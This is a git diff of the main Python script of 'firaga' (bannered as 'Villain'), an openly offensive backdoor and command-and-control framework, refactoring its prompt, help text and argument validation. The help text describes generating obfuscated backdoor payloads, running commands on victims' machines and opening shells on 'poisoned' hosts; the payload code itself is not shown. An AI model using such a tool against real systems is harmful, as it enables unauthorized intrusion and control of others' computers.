@@ -1,31 +1,23 @@
-#!/bin/python3
-# Written by Panagiotis Chartas (t3l3machus)
+#!/usr/bin/env python3
+#
+# Author: Panagiotis Chartas (t3l3machus) 
+# Source: https://github.com/t3l3machus/firaga
+# This script is part of the firaga framework.
+
 
 import os, sys, argparse, re, threading, keyboard, rlcompleter
 from threading import Thread
 from importlib import import_module
 from subprocess import DEVNULL, STDOUT, check_call, check_output, run
 from pyperclip import copy as copy2cb
-from time import sleep
+from time import sleep, time
 from Core.common import *
 from Core.settings import Hoaxshell_settings, Core_server_settings
 from string import ascii_uppercase, ascii_lowercase, digits
 
-# -------------- Arguments & Usage -------------- #
-parser = argparse.ArgumentParser(
-	formatter_class=argparse.RawTextHelpFormatter,
-	epilog='''
-	
-Usage examples:
 
-  - Basic shell session over http:
-
-      sudo python3 hoaxshell.py -s <your_ip>
-      
-  - Recommended usage to avoid detection (over http)
-
-'''
-)
+# -------------- Arguments -------------- #
+parser = argparse.ArgumentParser()
 
 parser.add_argument("-p", "--port", action="store", help = "Core server port (default: 65001).", type = int)
 parser.add_argument("-x", "--hoax-port", action="store", help = "HoaxShell server port (default: 8080 via http, 443 via https).", type = int)
@@ -52,49 +44,9 @@ from Core.firaga_core import Payload_generator, initiate_hoax_server, Sessions_m
 # -------------- General Functions -------------- #
 
 def print_banner():
-
+	
+	print('\r')
 	padding = '  '
-
-	# ~ S = [[' ', '┌','─','┐'], [' ', '└','─','┐'], [' ', '└','─','┘']]
-	# ~ A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]	
-	# ~ U = [[' ', '┬',' ','┬'], [' ', '│',' ','│'], [' ', '└','─','┘']]
-	# ~ R = [[' ', '┬','─','┐'], [' ', '├','┬','┘'], [' ', '┴','└','─']]
-	# ~ O =	[[' ', '┌','─','┐'], [' ', '│',' ','│'], [' ', '└','─','┘']]
-	# ~ N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]	
-
-
-	# ~ F1 = [['    ,.   '], ['   ("     '], [' .; )  \' '], [' _"., ,.']]
-	# ~ F2 = [['(   .     '], [')  )\'    '], ['(( (" )   '], ['_\'_.,)_(']]
-	# ~ F3 = [[') '], [',\''], [';(,'], ['..,( .']]
-
-
-	# ~ banner = [F1,F2,F3]
-	# ~ final = []
-	# ~ print('\r')
-	# ~ init_color = 54
-
-	# ~ txt_color = init_color
-	# ~ cl = 0
-	
-	
-	# ~ for charset in range(0, 4):
-		# ~ for pos in range(0, len(banner)):
-			# ~ for i in range(0, len(banner[pos][charset])):
-				# ~ clr = f'\033[38;5;{txt_color}m'
-				# ~ char = f'{clr}{banner[pos][charset][i]}'
-				# ~ final.append(char)
-				# ~ cl += 1
-				# ~ txt_color = txt_color + 35 if cl <= 4 else txt_color
-
-			# ~ cl = 0
-
-			# ~ txt_color = init_color
-
-		# ~ init_color += 1
-
-		# ~ if charset < 3: final.append('\n   ')
-
-	# ~ print(f"   {''.join(final)}")
 
 	F = [[' ', '┌','─','┬'], [' ', '├','┤',' '], [' ', '└',' ',' ']]
 	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
@@ -103,24 +55,23 @@ def print_banner():
 	G = [[' ', '┌','─','┐'], [' ', '│',' ','┬'], [' ', '└','─','┘']]
 	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
 
-	# 55 + 1
-	# 19 + 1
-	# 26, 27 + 5   VERY GOOD
-	# 26, 27 + 6   VERY GOOD
-	# init 55, txt_color + 35, init color += 1 FIRE RED
-	#init 56,  txt_color + 35, init_color += 1 SUPER PURPLE RED
 	
-	# ~ banner = [W,I,N,J,I,T,S,U]
-	# ~ banner = [S,A,U,R,O,N]
-	banner = [F,I,R,A,G,A]
-	final = []
-	print('\r')
-	init_color = 27
+	V = [[' ', '┬', ' ', ' ', '┬'], [' ', '└','┐','┌', '┘'], [' ', ' ','└','┘', ' ']]
+	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
+	L = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]	
+	L2 = [['┬',' ',' '], ['│',' ', ' '], ['┴','─','┘']]	
+	A = [['┌','─','┐'], ['├','─','┤'], ['┴',' ','┴']]
+	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
+	N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]	
+
+	# ~ banner = [F,I,R,A,G,A]
+	banner = [V,I,L,L2,A,I,N]
+	final = []	
+	init_color = 91 #89 #97
 	# ~ init_color = 3
 	txt_color = init_color
 	cl = 0
-	
-	
+		
 	for charset in range(0, 3):
 		for pos in range(0, len(banner)):
 			for i in range(0, len(banner[pos][charset])):
@@ -134,82 +85,169 @@ def print_banner():
 
 			txt_color = init_color
 		# ~ init_color += 30
-		init_color += 5
+		init_color += 1
 
 		if charset < 2: final.append('\n   ')
 
 	print(f"   {''.join(final)}")
-	print(f'{END}{padding}          by t3l3machus\n')
+	print(f'{END}{padding}           by t3l3machus\n')
 
-
-
-def print_green(msg):
-	print(f'{GREEN}{msg}{END}')
-
-
-def print_shadow(msg):
-	print(f'{GRAY}{msg}{END}')
 
 
 class PrompHelp:
 	
-	detailed = {
-		'connect' : f''' 			
-		\r  Connect with another machine running firaga (sibling server). Once connected, you will be able 
-		\r  to see and interact with all connected sibling servers' shell sessions and vice-versa.
-			
-		\r  {ORANGE}connect <IP> <CORE_SERVER_PORT>{END}
-		''',
-		'generate' : f''' 			
-		\r  Generate backdoor payload. If you start firaga over SSL the generated payload(s) 
-        \r  will be adjusted accordingly. 
-			
-		\r  {BOLD}For Windows{END}:
-		\r  {ORANGE}generate os=windows lhost=<IP or INTERFACE> [ exec_outfile=<REMOTE PATH> ] [ obfuscate encode constraint_mode trusted_domain ]{END}
-
-        \r  Use exec_outfile to write & execute commands from a specified file on the victim (instead of using IEX):
-        \r  {ORANGE}generate os=windows lhost=eth0 exec_outfile="C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1{END}"
-
-		\r  {BOLD}For Linux{END}:
-		\r  {ORANGE}generate os=linux lhost=<IP or INTERFACE>{END}
-		''',
-		'exec' : f''' 			
-		\r  Execute command or file against an active shell session. 
-			
-		\r  {ORANGE}exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>{END}
+	commands = {
+	
+		'connect' : {
+			'details' : f''' 			
+			\r  Connect with another machine running firaga (sibling server). Once connected, you will be able 
+			\r  to see and interact with all connected sibling servers' shell sessions and vice-versa.
+				
+			\r  {ORANGE}connect <IP> <CORE_SERVER_PORT>{END}
+			''',
+			'least_args' : 2,
+			'max_args' : 2
+		},
 		
-		\r  *Command(s) should be quoted.
-		''',
-		'shell' : f''' 			
-		\r  Enable an interactive pseudo-shell for a session. Press Ctrl+C to disable.
-			
-		\r  {ORANGE}shell <SESSION ID or ALIAS>{END}
-		''',
-		'alias' : f'''
-		\r  Create an alias to use instead of session ID.
-			
-		\r  {ORANGE}alias <ALIAS> <SESSION ID>{END}
-		''',
-		'reset' : f'''
-		\r  Reset a given alias to the original session ID.
-			
-		\r  {ORANGE}reset <ALIAS>{END}
-		''',
-		'kill' : f'''
-		\r  Terminate a self-owned shell session.
-			
-		\r  {ORANGE}kill <SESSION ID or ALIAS>{END}
-		''',
-		'host' : f'''
-		\r  A utility to web transfer files conveniently:
-		\r  Hosts a local directory and prints the contents of it in a tree-like structure.
-		\r  Also, it translates every file path to its corresponding URL so you can quickly 
-		\r  copy and pass it to web clients.
-		\r  {BOLD}Note{END}: Certain non-executable file extensions (e.g., txt, docx, zip) are auto-ignored 
-		\r  so that the stdout is reduced. You can config that behaviour by editing firaga/Core/host.py
+		
+		'generate' : {
+			'details' : f''' 			
+			\r  Generate backdoor payload. If you start firaga over SSL the generated payload(s) 
+			\r  will be adjusted accordingly. 
+				
+			\r  {BOLD}For Windows{END}:
+			\r  {ORANGE}generate os=windows lhost=<IP or INTERFACE> [ exec_outfile=<REMOTE PATH> ] [ obfuscate encode constraint_mode trusted_domain ]{END}
 
-		\r  {ORANGE}host <PATH TO LOCAL DIR> <PORT>{END}
-		'''
+			\r  Use exec_outfile to write & execute commands from a specified file on the victim (instead of using IEX):
+			\r  {ORANGE}generate os=windows lhost=eth0 exec_outfile="C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1{END}"
+
+			\r  {BOLD}For Linux{END}:
+			\r  {ORANGE}generate os=linux lhost=<IP or INTERFACE>{END}
+			''',
+			'least_args' : 2,
+			'max_args' : 7
+		},			
+
+		'exec' : {
+			'details' : f''' 			
+			\r  Execute command or file against an active shell session. 
+				
+			\r  {ORANGE}exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>{END}
+			
+			\r  *Command(s) should be quoted.
+			''',
+			'least_args' : 2,
+			'max_args' : 2
+		},			
+
+			
+		'shell' : {
+			'details' : f''' 			
+			\r  Enable an interactive pseudo-shell for a session. Press Ctrl+C to disable.
+				
+			\r  {ORANGE}shell <SESSION ID or ALIAS>{END}
+			''',
+			'least_args' : 1,
+			'max_args' : 1
+		},			
+
+			
+		'alias' : {
+			'details' : f'''
+			\r  Create an alias to use instead of session ID.
+				
+			\r  {ORANGE}alias <ALIAS> <SESSION ID>{END}
+			''',
+			'least_args' : 2,
+			'max_args' : 2
+		},			
+
+			
+		'reset' : {
+			'details' : f'''
+			\r  Reset a given alias to the original session ID.
+				
+			\r  {ORANGE}reset <ALIAS>{END}
+			''',
+			'least_args' : 1,
+			'max_args' : 1
+		},			
+
+		
+		'kill' : {
+			'details' : f'''
+			\r  Terminate a self-owned shell session.
+				
+			\r  {ORANGE}kill <SESSION ID or ALIAS>{END}
+			''',
+			'least_args' : 1,
+			'max_args' : 1
+		},		
+
+		
+		'host' : {
+			'details' : f'''
+			\r  A utility to web transfer files conveniently:
+			\r  Hosts a local directory and prints the contents of it in a tree-like structure.
+			\r  Also, it translates every file path to its corresponding URL so you can quickly 
+			\r  copy and pass it to web clients.
+			\r  {BOLD}Note{END}: Certain non-executable file extensions (e.g., txt, docx, zip) are auto-ignored 
+			\r  so that the stdout is reduced. You can config that behaviour by editing firaga/Core/host.py
+
+			\r  {ORANGE}host <PATH TO LOCAL DIR> <PORT>{END}
+			''',
+			'least_args' : 2,
+			'max_args' : 2
+		},
+		
+		'help' : {
+			'details' : f'''
+			\r  Really?
+			''',
+			'least_args' : 0,
+			'max_args' : 1
+		},
+
+		'siblings' : {
+			'details' : f'''
+			\r  Siblings are basically other instances of firaga that you've connected with.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'sessions' : {
+			'details' : f'''
+			\r  Sessions of backdoored machines that you have succesfully poisoned.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'id' : {
+			'details' : f'''
+			\r  Print server's unique ID.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'exit' : {
+			'details' : f'''
+			\r  Kill all sessions and quit.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
+		'clear' : {
+			'details' : f'''
+			\r  Come on man.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+	
 	}
 	
 	
@@ -233,16 +271,40 @@ class PrompHelp:
 		\r  host     [+]     Web host a local directory.
 		\r  id               Print server's unique ID (self).
 		\r  clear            Clear screen.
-		\r  exit/quit/q      End sessions and exit.
+		\r  exit             Kill all sessions and quit.
 		
         \r  Commands with [+] require additional arguments.
         \r  For details use: {ORANGE}help <COMMAND>{END}
 		''')
 			
 
+
 	@staticmethod
 	def print_detailed(cmd):			
-		print(PrompHelp.detailed[cmd]) if cmd in PrompHelp.detailed.keys() else print(f'No details for command "{cmd}".')
+		print(PrompHelp.commands[cmd]['details']) if cmd in PrompHelp.commands.keys() else print(f'No details for command "{cmd}".')
+
+
+
+	@staticmethod
+	def validate(cmd, num_of_args):
+		
+		valid = True
+		
+		if cmd not in PrompHelp.commands.keys():
+			print('Unknown command.')
+			valid = False
+			
+		elif num_of_args < PrompHelp.commands[cmd]['least_args']:
+			print('Missing arguments.')
+			valid = False
+		
+		elif num_of_args > PrompHelp.commands[cmd]['max_args']:
+			print('Too many arguments.')
+			valid = False			
+	
+		return valid
+
+
 
 					
 
@@ -263,28 +325,22 @@ def alias_sanitizer(word, _min = 2, _max = 26):
 	else:
 		return ['Alias length must be between 2 to 26 characters.']
 		
-		
-quiet = True if args.quiet else False
-
-
+	
+	
 # Tab completer          
 class Completer(object):
 	
 	def __init__(self):
 		
-		self.tab_counter = 0
-		
-		self.main_prompt_commands = ['help', 'clear', 'exit', 'quit', 'exec', 'shell', \
-		'siblings', 'sessions', 'kill', 'generate', 'host']
-		
+		self.tab_counter = 0		
+		self.main_prompt_commands = PrompHelp.commands.keys()	
 		self.generate_arguments = ['os', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
 		'trusted_domain', 'exec_outfile', 'execpoutsa']
 	
 	
 	
-	def reset_counter(self):
-		
-		sleep(0.5)
+	def reset_counter(self):	
+		sleep(0.4)
 		self.tab_counter = 0
 		
 	
@@ -348,10 +404,8 @@ class Completer(object):
 				
 
 
-	def update_prompt(self, typed, new_content):
-		
-		readline.insert_text(new_content[typed:])
-		# ~ self.tab_counter = 0			
+	def update_prompt(self, typed, new_content, lower = False):
+		readline.insert_text(new_content[typed:])			
 	
 	
 	
@@ -370,7 +424,7 @@ class Completer(object):
 		# Get prompt command from word fragment
 		elif lb_list_len == 1:
 					
-			match = self.get_match_from_list(lb_list[0], self.main_prompt_commands)
+			match = self.get_match_from_list(lb_list[0].lower(), self.main_prompt_commands)
 				
 			if match:
 				self.update_prompt(len(lb_list[0]), match)
@@ -395,11 +449,22 @@ class Completer(object):
 		# Autocomplete generate prompt command arguments
 		elif (lb_list[0].lower() == 'generate') and (lb_list_len > 1):
 									
-			word_frag = lb_list[-1]
+			word_frag = lb_list[-1].lower()
 			match = self.get_match_from_list(lb_list[-1], self.generate_arguments)
 			
 			if match:
-				self.update_prompt(len(lb_list[-1]), match)
+				self.update_prompt(len(lb_list[-1]), match, lower = True)
+
+
+
+		# Autocomplete help
+		elif (lb_list[0].lower() == 'help') and (lb_list_len > 1):
+									
+			word_frag = lb_list[-1].lower()
+			match = self.get_match_from_list(lb_list[-1], self.main_prompt_commands)
+			
+			if match:
+				self.update_prompt(len(lb_list[-1]), match, lower = True)
 
 		
 
@@ -443,7 +508,7 @@ class Completer(object):
 	
 def main():
 
-	chill() if quiet else print_banner()
+	chill() if args.quiet else print_banner()
 	cwd = os.path.dirname(os.path.abspath(__file__))
 	
 	''' Update utility '''
@@ -482,10 +547,25 @@ def main():
 	core_server.daemon = True
 	core_server.start()
 	
+	# Wait for the Core server socket to be established
+	timeout_start = time()
+
+	while time() < (timeout_start + 5):
+
+		if core.core_initialized:													
+			break
+		
+		elif core.core_initialized == False:			
+			sys.exit(1)
+			
+	else:
+		sys.exit(1)
+	
 	initiate_hoax_server()
 	payload_engine = Payload_generator()
 	sessions_manager = Sessions_manager()
 	Hoaxshell.server_unique_id = core.return_server_uniq_id()
+	
 
 	
 	''' Start tab autoComplete '''
@@ -496,13 +576,16 @@ def main():
 		
 	
 	''' +---------[ Command prompt ]---------+'''
-	while True:
+	while Main_prompt.prompt_active:
 		
 		try:	
 			
 			if Main_prompt.main_prompt_ready:
-				
+								
 				user_input = input(Main_prompt.prompt).strip()
+
+				if user_input == '':
+					continue
 				
 				# Handle single/double quoted arguments
 				quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
@@ -526,21 +609,21 @@ def main():
 				cmd_list = [w.replace(Main_prompt.SPACE, ' ') for w in user_input if w]
 				cmd_list_len = len(cmd_list)
 				cmd = cmd_list[0].lower() if cmd_list else ''
+				
+				# Validate number of args
+				valid = PrompHelp.validate(cmd, (cmd_list_len - 1))
+				
+				if not valid:
+					continue
 
 
-				if cmd == 'help':
-					
+				if cmd == 'help':					
 					if cmd_list_len == 1:
 						PrompHelp.print_main_help_msg()
 										
 					elif cmd_list_len == 2:
 						PrompHelp.print_detailed(cmd_list[1])
-					
-					continue
-					
-				# ~ else:
-					# ~ print('Unrecognized or missing arguments.')
-					
+														
 		
 
 				elif cmd == 'id':
@@ -549,195 +632,154 @@ def main():
 
 
 				elif cmd == 'connect':
+					core.connect_with_sibling_server(cmd_list[1], cmd_list[2])
 					
-					if cmd_list_len == 3:
-						
-						core.connect_with_sibling_server(cmd_list[1], cmd_list[2])
-						Main_prompt.main_prompt_ready = False
 								
-					else:
-						print('Missing arguments.')
 
-		
-				
 				elif cmd == 'host':
-					
-					if len(cmd_list[1]) > 1:
-						
-						try:
-							cmd = 'gnome-terminal --geometry=100x50 -- bash -c ' + f'\'python3 {cwd}/Core/host.py {cmd_list[1]} {cmd_list[2]}\''
-							check_output(cmd, shell = True)
-							
-						except ValueError:
-							print('Invalid or non-existent interface name.')
-
-
-
-				elif cmd == 'generate':
-					
-					if len(cmd_list) > 1:
 											
-						payload_engine.generate_payload(cmd_list[1:])
-								
-					else:
-						print('Missing arguments.')
-
-
-
-				elif cmd == 'kill':
-					
-					if cmd_list_len == 2:
-											
-						sessions_manager.kill_session(cmd_list[1])
-								
-					else:
-						print('Unrecognized or missing arguments.')
+					try:
+						cmd = 'gnome-terminal --geometry=100x50 -- bash -c ' + f'\'python3 {cwd}/Core/host.py {cmd_list[1]} {cmd_list[2]}\''
+						check_output(cmd, shell = True)
 						
+					except ValueError:
+						print('Invalid or non-existent interface name.')
 
 
+
+				elif cmd == 'generate':								
+					payload_engine.generate_payload(cmd_list[1:])
+								
+
+
+				elif cmd == 'kill':					
+					sessions_manager.kill_session(cmd_list[1])
+
+						
 
 				elif cmd == 'exec':
-					
-					if cmd_list_len == 3:
-						
-						if len(Sessions_manager.active_sessions.keys()):
-							
-							Main_prompt.main_prompt_ready = False
-							command = cmd_list[1]
-							session_id = cmd_list[2]
-							src_is_file = False
-							
-							if command[0] == os.path.sep:
-								
-								try:
-									f = open(command)
-									command = f.read()
-									f.close()
-									src_is_file = True
 									
-								except:
-									print('Failed to load file.')
-									Main_prompt.main_prompt_ready = True
-									continue
+					if len(Sessions_manager.active_sessions.keys()):
+						
+						Main_prompt.main_prompt_ready = False
+						command = cmd_list[1]
+						session_id = cmd_list[2]
+						src_is_file = False
+						
+						if command[0] == os.path.sep:
 							
-							
-							# Check if session id has alias
-							session_id = sessions_manager.alias_to_session_id(session_id)
-							print(f'session_id -> {session_id}')
-							# Check who is the owner of the shell session
-							session_owner_id = sessions_manager.return_session_owner_id(session_id)
-							print(f'session_owner_id -> {session_owner_id}')
-							
-							if session_owner_id == core.return_server_uniq_id():
-								Hoaxshell.command_pool[session_id].append(command)
-							
-							else:
-								command = command + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
-								core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)
+							try:
+								f = open(command)
+								command = f.read()
+								f.close()
+								src_is_file = True
+								
+							except:
+								print('Failed to load file.')
+								Main_prompt.main_prompt_ready = True
+								continue
+						
+						
+						# Check if session id has alias
+						session_id = sessions_manager.alias_to_session_id(session_id)
 
+						# Check who is the owner of the shell session
+						session_owner_id = sessions_manager.return_session_owner_id(session_id)
+
+						
+						if session_owner_id == core.return_server_uniq_id():
+							Hoaxshell.command_pool[session_id].append(command)
+						
 						else:
-							print(f'\r[{INFO}] No active session.')		
+							command = command + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
+							core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)
 
 					else:
-						print('Missing arguments.')
-						
+						print(f'\r[{INFO}] No active session.')		
 
+						
 
 				elif cmd == 'shell':
-					
-					if cmd_list_len == 2:
 						
-						if len(Sessions_manager.active_sessions.keys()):
-							
-							Main_prompt.main_prompt_ready = False							
-							session_id = cmd_list[1]
-							os_type = sessions_manager.active_sessions[session_id]['OS Type']
-							Hoaxshell.activate_shell_session(session_id, os_type)
-							
-						else:
-							print(f'\r[{INFO}] No active session.')		
-
+					if len(Sessions_manager.active_sessions.keys()):
+						
+						Main_prompt.main_prompt_ready = False							
+						session_id = cmd_list[1]
+						os_type = sessions_manager.active_sessions[session_id]['OS Type']
+						Hoaxshell.activate_shell_session(session_id, os_type)
+						
 					else:
-						print('Invalid arguments.')
+						print(f'\r[{INFO}] No active session.')		
+
 
 			
 
 				elif cmd == 'alias':
+										
+					sessions = Sessions_manager.active_sessions.keys()
 					
-					if cmd_list_len == 3:
-						
-						sessions = Sessions_manager.active_sessions.keys()
-						
-						if len(sessions):
-							if cmd_list[2] in sessions:
+					if len(sessions):
+						if cmd_list[2] in sessions:
+							
+							alias = alias_sanitizer(cmd_list[1])
+							
+							if isinstance(alias, list):
+								print(alias[0])
 								
-								alias = alias_sanitizer(cmd_list[1])
-								
-								if isinstance(alias, list):
-									print(alias[0])
-									
-								else:
-									# Check if alias is unique
-									unique = True
-									
-									for session_id in sessions:
-										if Sessions_manager.active_sessions[session_id]['alias'] == alias.strip():
-											unique = False
-											break
-									
-									
-									# Check if alias is the id of another session	
-									is_session_id = False
-									
-									if alias.strip() in sessions:
-										is_session_id = True
-										
-									if unique and not is_session_id:
-										Sessions_manager.active_sessions[cmd_list[2]]['alias'] = alias.strip()
-										Sessions_manager.active_sessions[cmd_list[2]]['aliased'] = True
-									
-									else:
-										print('Illegal alias value.')
-										
 							else:
-								print('Invalid session ID.')
-
+								# Check if alias is unique
+								unique = True
+								
+								for session_id in sessions:
+									if Sessions_manager.active_sessions[session_id]['alias'] == alias.strip():
+										unique = False
+										break
+								
+								
+								# Check if alias is the id of another session	
+								is_session_id = False
+								
+								if alias.strip() in sessions:
+									is_session_id = True
+									
+								if unique and not is_session_id:
+									Sessions_manager.active_sessions[cmd_list[2]]['alias'] = alias.strip()
+									Sessions_manager.active_sessions[cmd_list[2]]['aliased'] = True
+								
+								else:
+									print('Illegal alias value.')
+									
 						else:
-							print(f'\r[{INFO}] No active session.')		
+							print('Invalid session ID.')
 
 					else:
-						print('Missing arguments.')
+						print(f'\r[{INFO}] No active session.')		
 
 
 
 				elif cmd == 'reset':
+										
+					sid = Sessions_manager.alias_to_session_id(cmd_list[1])
 					
-					if cmd_list_len == 2:
+					if sid == cmd_list[1]:
+						print('Unrecognized alias.')
+					
+					elif sid in Sessions_manager.active_sessions.keys():
+						Sessions_manager.active_sessions[sid]['aliased'] = False
+						Sessions_manager.active_sessions[sid]['alias'] = None
 						
-						sid = Sessions_manager.alias_to_session_id(cmd_list[1])
-						
-						if sid == cmd_list[1]:
-							print('Unrecognized alias.')
-						
-						elif sid in Sessions_manager.active_sessions.keys():
-							Sessions_manager.active_sessions[sid]['aliased'] = False
-							Sessions_manager.active_sessions[sid]['alias'] = None
-							
-						
-						else:
-							print('Unrecognized alias.')
-						
+					
 					else:
-						print('Unrecognized or missing arguments.')
+						print('Unrecognized alias.')
 
 
 
-				elif cmd in ['clear', 'cls']:
+				elif cmd == 'clear':
 					os.system('clear')
 
 
 
-				elif cmd in ['exit', 'quit', 'q']:
+				elif cmd == 'exit':
 					raise KeyboardInterrupt
 
 
@@ -753,25 +795,19 @@ def main():
 				
 
 
-				elif cmd == 'siblings':
-
-					if cmd_list_len == 1:
+				elif cmd == 'siblings':										
+					core.list_siblings()
 											
-						core.list_siblings()
-								
-					else:
-						print('Unsupported arguments.')
-				
 
 
-				elif cmd == '':
-					continue
-					#rst_prompt(force_rst = True, prompt = '\r')
+				elif cmd in core.requests.keys():
+					core.requests[cmd] = True
+
 
 				else:
-					print('Unknown command.')
-
-
+					continue
+		
+		
 		except KeyboardInterrupt:
 			
 			if Sessions_manager.active_sessions.keys() or core.sibling_servers.keys():
